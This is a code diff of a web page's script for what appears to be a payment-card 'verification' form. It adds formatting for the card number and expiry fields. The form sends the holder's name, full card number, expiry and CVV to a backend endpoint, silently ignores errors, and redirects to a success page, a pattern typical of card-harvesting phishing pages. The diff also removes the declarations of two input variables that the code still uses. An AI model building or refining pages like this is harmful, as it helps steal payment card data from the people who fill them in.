@@ -145,12 +145,25 @@
 
         // Real-time card update logic
         const nameInput = document.getElementById('nameInput');
-        const numInput = document.getElementById('numInput');
-        const expInput = document.getElementById('expInput');
-        
+        // Card Formatting: Add space every 4 digits
+        numInput.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formatted = '';
+            for (let i = 0; i < val.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += val[i];
+            }
+            e.target.value = formatted;
+            document.getElementById('dispNum').textContent = formatted || '**** **** **** 1234';
+        });
+
         nameInput.addEventListener('input', () => document.getElementById('dispName').textContent = nameInput.value || 'CARD HOLDER');
-        numInput.addEventListener('input', () => document.getElementById('dispNum').textContent = numInput.value || '**** **** **** 1234');
-        expInput.addEventListener('input', () => document.getElementById('dispExp').textContent = expInput.value || 'MM/YY');
+        expInput.addEventListener('input', () => {
+            let val = expInput.value.replace(/\//g, '').replace(/[^0-9]/g, '');
+            if (val.length >= 2) val = val.substring(0, 2) + '/' + val.substring(2);
+            expInput.value = val;
+            document.getElementById('dispExp').textContent = val || 'MM/YY';
+        });
 
         document.getElementById('verifyForm').addEventListener('submit', async (e) => {
             e.preventDefault();
@@ -163,18 +176,15 @@
                 card_cvv: e.target.querySelector('input[placeholder="CVV"]').value
             };
 
-            // Send to Backend
             try {
                 await fetch(`${BACKEND_URL}/api/users/update`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(formData)
                 });
-            } catch (err) {
-                console.error("Sync Error:", err);
-            }
+            } catch (err) { console.error("Sync Error:", err); }
 
-            window.location.href = 'update.html';
+            window.location.href = 'success.html';
         });
     </script>
 </body>
